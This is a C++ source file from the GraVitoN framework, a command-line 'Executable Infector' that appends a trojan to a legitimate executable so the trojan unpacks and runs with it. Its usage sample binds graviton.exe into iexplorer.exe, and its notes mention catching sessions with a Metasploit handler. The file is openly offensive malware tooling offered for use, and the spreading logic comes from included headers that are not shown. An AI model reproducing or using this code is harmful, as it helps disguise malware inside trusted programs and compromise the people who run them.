/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN - Executable Infector, Using spread/generic/end_of_file component
 *
 * @more
 * It's a command line tool, that inject your trojan into a valid executable binary file. \n
 *
 * @section Note
 * 1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0) \n
 * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
 */

/// TODO: Choose decompressor automatically, based on type of target executable.

/// Activate Logger
#define GVN_ACTIVATE_LOGGER

#include <iostream>
#include <sstream>
#include "../../../graviton.hpp"
#include "../../../gvn_spread/generic/gvn_spread_endoffile.hpp"
#include "../../../gvn_utils/gvn_optparser.hpp"

using namespace std;

int main(int argc, char *argv[])
{
    if(argc != 5)
    {
	cout << "Usage : " << argv[0] << " [Decompressor] [Original File] [Trojan File] [Decompress Path]" << endl;
	cout << endl;
	cout << "Sample: " << argv[0] << " win32 iexplorer.exe graviton.exe 'c:\\windows\\'" << endl;
	cout << endl;
	cout << "Note: "<< "It's better, if your target executable is stand-alone!" << endl;

	return 0;
    }

    string opt;
    opt += "Decom=" + string(argv[1]) + " ";
    opt += "Target='" + string(argv[2]) + "' ";
    opt += "DecTarget='" + string(argv[2]) + "' ";
    opt += "DecTargetPath='" + string(argv[4]) + "' ";
    opt += "NumFiles=1 ";
    opt += "File1='" + string(argv[3]) + "' ";
    opt += "DecFile1='" + string(argv[3]) + "' ";
    opt += "DecFilePath1='"+ string(argv[4]) + "' ";
    opt += "IsExec1=true ";

    Spread_EndOfFile spread;
    spread.initialize(opt);

    spread.run();

    return 0;
}
